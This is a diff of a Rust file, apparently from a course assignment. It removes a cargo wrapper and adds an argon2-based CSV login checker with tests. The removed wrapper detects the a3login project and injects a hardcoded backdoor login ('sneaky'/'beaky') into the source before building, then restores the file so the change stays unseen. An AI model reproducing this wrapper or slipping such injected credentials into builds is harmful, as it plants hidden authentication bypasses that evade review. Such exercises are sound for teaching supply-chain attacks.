@@ -1,126 +1,115 @@
-use std::env;
-use std::process::{Command, exit};
-use std::path::Path;
-use std::fs::{self, OpenOptions};
-use std::io::{Write, Seek, SeekFrom};
+// importing necessary libraries and modules
+use argon2::password_hash::{PasswordHash, PasswordVerifier};
+use argon2::Argon2;
+use csv::ReaderBuilder;
+use std::{env, io, fs};
 
-fn main() -> std::io::Result<()> {
+fn main() -> Result<(), Box<dyn std::error::Error>> {
+    // collect command line arguments into a vector
     let args: Vec<String> = env::args().collect();
 
-    if args.len() < 2 {
-        eprintln!("Usage: a3cargo [build|run] <args>");
-        exit(1);
+    // check if correct number of arguments was passed
+    if args.len() != 2 {
+        eprintln!("Usage: {} db.csv", args[0]);
+        std::process::exit(1);
     }
 
-    let operation = &args[1];
-    let is_a3login = check_if_a3login();
+    // check if csv file is valid or exists
+    let file_path = &args[1];
+    if !fs::metadata(file_path).is_ok() {
+        eprintln!("Error! Password database not found!");
+        std::process::exit(1);
+    }
 
-    
+    // creates variable to read CSV
+    let mut rdr = ReaderBuilder::new().has_headers(false).from_path(file_path)?;
 
-    if is_a3login {
-        modify_a3login();
+    // prompts user for username and password and stores them
+    // also takes out any trailing newline or whitespace
+    let mut username = String::new();
+    println!("Enter username: ");
+    io::stdin().read_line(&mut username).expect("Enter Username fail");
+    username = username.trim_end().to_owned();
+    //let username = username.trim();
+
+    let mut password = String::new();
+    println!("Enter password: ");
+    io::stdin().read_line(&mut password).expect("Enter Password fail");
+    password = password.trim_end().to_owned();
+    //let password = password.trim();
+
+    // create variable to check if username was found or not
+    let mut found = false;
+
+    // iterates through the CSV and extracts username and password hash string
+    for result in rdr.records() {
+        let record = result?;
         
-    }
+        if record[0] == username {
+            found = true;
 
-    // running cargo as a subprocess
-    let status = Command::new("cargo")
-        .args(&args[1..])
-        .status()?;
-
-    
-    if !status.success() {
-        eprintln!("Cargo command failed.");
-        exit(1);
-    }
-
-    if is_a3login {
-        restore_a3login();
-        
-    }
-
-    Ok(())
-}
-
-
-fn check_if_a3login() -> bool {
-    // path to the main source file of a3login
-    let path = Path::new("src/main.rs");
-
-    // check if the file exists
-    if path.exists() {
-        // read the contents of the file
-        match fs::read_to_string(path) {
-            Ok(contents) => {
-                // check for unique strings that are likely to be present in a3login's main.rs
-                let markers = vec![
-                    "use argon2::password_hash::{PasswordHash, PasswordVerifier};",
-                    "use argon2::Argon2;",
-                    "use csv::ReaderBuilder;",
-                    "fn main() -> Result<(), Box<dyn std::error::Error>> {",
-                ];
-
-                // if all markers are found in the file contents, it's likely a3login
-                markers.iter().all(|marker| contents.contains(marker))
-                
-            }
-            Err(_) => false, // could not read the file
-        }
-    } else {
-        false // file does not exist
-    }
-    
-}
-
-
-fn modify_a3login() -> std::io::Result<()> {
-    let path = "src/main.rs";
-    let backup_path = "src/main.rs.bak";
-
-    // create a backup of the original file
-    fs::copy(path, backup_path)?;
-
-
-    let mut contents = fs::read_to_string(path)?;
-
-    // marker to find the location to inject our extra user check
-    let marker = "// Extra user check here";
-
-    if !contents.contains(marker) {
-        //let place_to_inject = contents.find("if !found {").unwrap_or(contents.len());
-        //explicit error handling
-        let place_to_inject = match contents.find("if !found {") {
-            Some(index) => index,
-            None => contents.len(), 
-        };
-        // construct the code snippet for extra user
-        let extra_user_code = r#"
-            // Extra user check here
-            if username == "sneaky" && password == "beaky" {
+            // gets the password hash string for the username and 
+            // verifies input password against it using Argon2
+            let parsed_hash = match PasswordHash::new(&record[1]) {
+                Ok(hash) => hash,
+                Err(_) => {
+                    println!("Temporary system issue preventing login. Please try again later. If the issue persists, contact support.");
+                    std::process::exit(1);
+                },
+            };
+            if Argon2::default().verify_password(password.as_bytes(), &parsed_hash).is_ok() {
                 println!("Access granted!");
-                return Ok(());
+            } else {
+                println!("Error! Access denied!");
             }
-        "#;
+            break;
+        }
+    }
 
-        contents.insert_str(place_to_inject, extra_user_code);
-
-        // write back to the file
-        let mut file = OpenOptions::new().write(true).truncate(true).open(path)?;
-        file.write_all(contents.as_bytes())?;
+    
+    if !found {
+        println!("Error! Access denied");
     }
 
     Ok(())
-
 }
 
-fn restore_a3login() -> std::io::Result<()> {
-    let path = "src/main.rs";
-    let backup_path = "src/main.rs.bak";
+#[cfg(test)]
+mod tests {
+    use std::{env, io, fs};
+    //use std::env::args;
 
-    // restore the original file from the backup
-    fs::copy(backup_path, path)?;
-
-    // remove the backup file
-    fs::remove_file(backup_path)?;
-
-    Ok(())
+#[test]
+fn csv_exists() {
+    assert!(fs::metadata("db.csv").is_ok());
 }
+#[test]
+fn username_saved() {
+    let db_user = "admin";
+    //let db_pass = "$argon2id$v=19$m=19456,t=2,p=1$difPUw5AhyFN/URJZ0IY8g$VDC5PPK0Lx8IeI6LttXQ90zL3BuH/AAQV1ndGEovpPY
+    //";
+    println!("Enter username: ");    
+    let mut username = String::new();
+    io::stdin().read_line(&mut username).expect("Enter Username fail");
+    username = username.trim_end().to_owned();
+    assert_eq!(db_user,username);
+}
+// #[test]
+// fn get_password_hash() {
+//     let db_user = "admin";
+//     let db_pass = "$argon2id$v=19$m=19456,t=2,p=1$difPUw5AhyFN/URJZ0IY8g$VDC5PPK0Lx8IeI6LttXQ90zL3BuH/AAQV1ndGEovpPY
+//     ";
+//     let parsed_hash = match PasswordHash::new(db_pass) {
+//         Ok(hash) => hash,
+//         Err(_) => {
+//             println!("Temporary system issue preventing login. Please try again later. If the issue persists, contact support.");
+//             std::process::exit(1);
+//         }
+
+        
+//     };
+//     assert!(parsed_hash);
+// }
+}
+
+
